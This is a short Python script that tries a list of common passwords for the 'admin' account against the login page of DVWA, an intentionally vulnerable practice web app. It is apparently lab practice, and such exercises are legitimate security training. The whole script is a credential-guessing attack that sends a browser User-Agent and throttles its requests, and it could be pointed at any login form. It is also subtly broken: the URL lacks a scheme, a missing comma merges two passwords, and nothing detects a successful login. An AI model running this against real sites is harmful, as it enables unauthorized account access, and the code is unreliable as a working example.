import requests
import time

url = "DVWA:8080/login.php"

user = "admin"
passwords = [
    "123456",
    "passw",
    "admin",
    "panticora",
    "quer",
    "admin123",
    "torcido"
    "bandido"
]

headers = {
    "User-Agent": "Mozilla/5.0"
}

session = requests.Session()

for pwd in passwords:
    data = {
        "username": user,
        "password": pwd,
        "Login": "Login"
    }

    r = session.post(url, data=data, headers=headers, allow_redirects=False)

    print(f"[+] Trying {user}:{pwd} -> Status {r.status_code}")

    time.sleep(2) 
